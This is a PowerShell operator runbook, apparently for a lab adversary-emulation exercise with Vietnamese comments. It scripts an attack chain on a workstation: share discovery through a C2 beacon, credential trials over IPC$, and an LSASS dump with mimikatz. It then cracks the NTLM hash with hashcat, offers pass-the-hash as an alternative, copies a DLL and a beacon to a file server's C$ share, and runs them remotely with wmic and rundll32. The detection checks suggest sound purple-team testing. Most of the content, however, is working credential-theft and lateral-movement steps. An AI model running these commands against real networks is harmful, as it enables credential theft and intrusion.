<#
C0015 phase-2 guided operator run — RUN ON WS01 (192.168.50.20), duc.user console.
Covers the operator-interactive steps: S0 seed -> S5 (remote note) -> S7 -> S7b -> S8a -> S8b.
(S4/S5 are driven remotely from the C2 host — see run_campaign_orchestrator.ps1.)

Passwords are ALWAYS entered at interactive prompts (net use * / runas) — never in
files, command lines or logs. Keep the S0 window OPEN until verification of S9.

Usage:
  pwsh -ExecutionPolicy Bypass -File payloads/packaging/run_ws01_operator.ps1 -RunId RUN-20260928-02 [-StagingDir C:\stage]
#>
[CmdletBinding()]
param(
    [string]$RunId = 'RUN-UNSET',
    [string]$StagingDir = 'C:\stage'   # folder on WS01 holding c0015_143_surrogate.dll + config-phase7.ini
)
$ErrorActionPreference = 'Stop'

function Step([string]$Title) { Write-Host "`n===== $Title =====" -ForegroundColor Cyan }
function Pause { Read-Host '   ... Enter de tiep tuc (Ctrl+C de dung)' | Out-Null }

Step 'S0 - IT logon seed (keeps it.admin ALIVE in WS01 lsass)'
Write-Host 'MOT CUA SO runas se mo ra. NHAP password it.admin tai prompt.'
Write-Host 'GIU CUA SO DO MO TOI KHI XONG S7b/S9 (Ctrl+C luc cleanup).'
Start-Process -FilePath runas.exe -ArgumentList '/user:C0015\it.admin', '"cmd /c ping -t 127.0.0.1"' -WindowStyle Normal | Out-Null
Pause

Step 'S5 - share probe (REMOTE via beacon, driven from C2 host)'
Write-Host 'S5 khong go tay tren WS01 - chay qua beacon (C2 host dieu khien):'
Write-Host '  pwsh -File stage/ws01/c2-console-phase2.ps1 -Action Runbook -RunId <run>   (runbook da co net view \FS01 + Get-SmbShare)'
Write-Host '  hoac -Action Cmd -Body "net view \\FS01"'
Write-Host '  hoac -Action Cmd -Body "powershell -NoProfile -Command `"Get-SmbShare | Out-File C:\ProgramData\found_shares.txt`""'
Write-Host 'Verify (Elastic WS01): E1 parent = beacon powershell + E11 found_shares.txt (DIRECT link).'
Pause

Step 'S7 - credential trial A/B/C (net use IPC$)'
Write-Host 'A) net use \FS01\IPC$ /user:C0015\duc.user *   -> expected error 5 (S4625)'
net use '\\FS01\IPC$' /user:C0015\duc.user *
net use \\FS01\IPC$ /delete *> $null
Write-Host 'B) net use \FS01\IPC$ /user:C0015\it.admin *   -> expected OK (S4648 + FS01 4624/4672)'
net use '\\FS01\IPC$' /user:C0015\it.admin *
Write-Host 'GIU ket noi B, KHONG /delete (giu them phiên it.admin song).'
Pause
Write-Host 'C) (tuy chon) net use \FS01\IPC$ /user:C0015\<revoked> * -> denied; sau do /delete.'

Step 'S7b - REAL LSASS dump -> obtain -> crack (WS01 + Kali)'
if (-not (Test-Path C:\Tools\mimikatz.exe)) {
    New-Item -Force -ItemType Directory C:\Tools | Out-Null
    foreach ($src in @("$StagingDir\mimikatz.exe", 'C:\Users\duc.user\Desktop\mimikatz.exe', 'C:\Users\Public\C0015\mimikatz.exe')) {
        if (Test-Path $src) { Copy-Item $src C:\Tools\mimikatz.exe -Force; break }
    }
    if (-not (Test-Path C:\Tools\mimikatz.exe)) {
        Write-Warning "Chua thay mimikatz.exe - dat vao C:\Tools\mimikatz.exe roi chay lai buoc nay."
    }
}
Write-Host '1) runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"'
Write-Host '   (password cua it.admin tai prompt de CHAY tool - day la buoc IT chay, khong phai credential pivot)'
Start-Process -FilePath runas.exe -ArgumentList '/user:C0015\it.admin', 'C:\Tools\mimikatz.exe sekurlsa::logonpasswords' -WindowStyle Normal | Out-Null
Pause
Write-Host '2) Trong output: chep DONG it.admin -> lay NTLM hash (khong co plaintext tren Win hien dai).'
Write-Host '3) Crack tren KALI: echo -n ''<NTLM>'' > /tmp/it.ntlm ; hashcat -m 1000 /tmp/it.ntlm rockyou.txt --show (hoac john --format=nt); rm -f /tmp/it.ntlm'
Write-Host '4) GIU plaintext trong bo nho - S8 (wmic) se dung plaintext CRACKED nay tai prompt runas.'
Write-Host '   (Alternative: sekurlsa::pth /user:it.admin /domain:c0015.lab /ntlm:<hash> "cmd /c wmic ..." - telemetry khac, khong co S4648)'
Pause

Step 'S8a - tool handoff (T1570): WS01 -> \\FS01\C$\C0015'
$dest = '\\FS01\C$\C0015'
try {
    New-Item -Force -ItemType Directory $dest | Out-Null
    Copy-Item "$StagingDir\c0015_143_surrogate.dll" "$dest\c0015_143_surrogate.dll" -Force
    Copy-Item "$StagingDir\config-phase7.ini"        "$dest\config-phase7.ini"        -Force
    Copy-Item C:\Users\Public\C0015\c0015_beacon.ps1 "$dest\c0015_beacon.ps1"         -Force
    Write-Host 'Da copy 143.dll + beacon + config-phase7 sang FS01.'
} catch {
    Write-Warning "Copy C$ bi tu choi (can quyen admin): $($_.Exception.Message)"
    Write-Host 'Chay lai buoc nay trong console it.admin, hoac copy thu cong:'
    Write-Host "  copy $StagingDir\c0015_143_surrogate.dll \\FS01\C$\C0015\"
}
Pause

Step 'S8b - WMI remote process (explicit it.admin)'
Write-Host 'CHAY THU CONG cau lenh sau (password tai prompt runas):'
Write-Host 'runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry\""'
Write-Host '(Neu khong co wmic: Invoke-CimMethod -Credential (Get-Credential C0015\it.admin) - ghi nhan PARTIAL - xem checklist.)'
Pause

Write-Host "`nWS01 steps xong (run_id=$RunId). Tiep: C2 host - S9 verify (ART-07-01 + callback) + artifacts + cleanup."
Write-Host 'NHAC: khi nao verify xong S9 moi Ctrl+C cua so S0.'